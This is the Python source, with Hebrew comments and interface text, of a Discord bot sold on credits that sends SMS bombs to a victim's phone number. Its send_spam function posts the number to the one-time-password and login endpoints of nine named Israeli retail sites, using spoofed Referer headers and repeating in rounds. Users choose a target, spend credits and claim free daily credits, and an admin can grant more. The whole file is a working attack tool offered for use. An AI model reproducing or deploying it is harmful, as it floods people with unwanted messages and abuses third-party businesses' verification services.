import discord
from discord.ext import commands
from discord import ui
import requests
import uuid
import os
import time
from flask import Flask
from threading import Thread
from datetime import datetime

# --- שרת Flask ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרות ---
TOKEN = os.environ.get('DISCORD_TOKEN')
ADMIN_ID = 1281295891579408418 # ה-ID שלך

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

user_credits = {} 
daily_claimed = {}

def send_spam(target):
    apis = [
        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target}, "type": "form", "ref": "https://www.ace.co.il/"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
        {"n": "Atmos General", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 6, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://footlocker.co.il/"},
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://fox.co.il/"},
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
        {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
        {"n": "Machsanei Hashmal", "u": "https://api-ns.atmos.co.il/rest/2/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 2, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"}
    ]
    success = 0
    for site in apis:
        try:
            h = {"User-Agent": "Mozilla/5.0", "Referer": site["ref"]}
            if site["type"] == "json":
                requests.post(site["u"], json=site["d"], headers=h, timeout=0.8)
            else:
                requests.post(site["u"], data=site["d"], headers=h, timeout=0.8)
            success += 1
            time.sleep(0.4)
        except: pass
    return success

# --- ממשק ---
class AttackModal(ui.Modal, title='🚀 Spam-Me Control'):
    phone = ui.TextInput(label='מספר טלפון', placeholder='0501234567', min_length=10, max_length=10)
    rounds = ui.TextInput(label='כמות סיבובים (קרדיטים)', placeholder='1 קרדיט = סיבוב אחד', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        uid = interaction.user.id
        needed = int(self.rounds.value) if self.rounds.value.isdigit() else 1
        if user_credits.get(uid, 0) < needed:
            return await interaction.response.send_message(f"❌ אין לך מספיק קרדיטים! יתרה: {user_credits.get(uid, 0)}", ephemeral=True)
        user_credits[uid] -= needed
        await interaction.response.send_message(f"⚡ התקיפה החלה! {needed} סיבובים על {self.phone.value}", ephemeral=True)
        for _ in range(needed): send_spam(self.phone.value)

class AttackView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    @ui.button(label='🚀 Spam Phone', style=discord.ButtonStyle.primary, custom_id='spam_btn')
    async def spam_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(AttackModal())
    @ui.button(label='💰 My Credits', style=discord.ButtonStyle.secondary, custom_id='credits_btn')
    async def credits_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_message(f"💰 היתרה שלך: **{user_credits.get(interaction.user.id, 0)} קרדיטים**", ephemeral=True)
    @ui.button(label='🎁 Daily Gift', style=discord.ButtonStyle.success, custom_id='gift_btn')
    async def gift_button(self, interaction: discord.Interaction, button: ui.Button):
        uid, today = interaction.user.id, datetime.now().date()
        if daily_claimed.get(uid) == today:
            return await interaction.response.send_message("❌ כבר לקחת היום!", ephemeral=True)
        user_credits[uid] = user_credits.get(uid, 0) + 5
        daily_claimed[uid] = today
        await interaction.response.send_message("✅ קיבלת **5 קרדיטים**!", ephemeral=True)

@bot.event
async def on_ready(): print(f'✅ {bot.user.name} Live!')

@bot.command()
async def setup(ctx):
    if ctx.author.id == ADMIN_ID:
        embed = discord.Embed(title="🚀 Spam-Me Panel", description="1. לחץ Daily Gift\n2. לחץ Spam Phone\n3. תהנה!", color=0x5865F2)
        await ctx.send(embed=embed, view=AttackView())

# --- פקודת הוספת קרדיטים (למנהל בלבד) ---
@bot.command()
async def add(ctx, member: discord.Member, amount: int):
    if ctx.author.id == ADMIN_ID:
        user_credits[member.id] = user_credits.get(member.id, 0) + amount
        await ctx.send(f"✅ טענתי **{amount}** קרדיטים למשתמש {member.mention}!")
    else:
        await ctx.send("❌ אין לך הרשאה להשתמש בפקודה זו.")

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
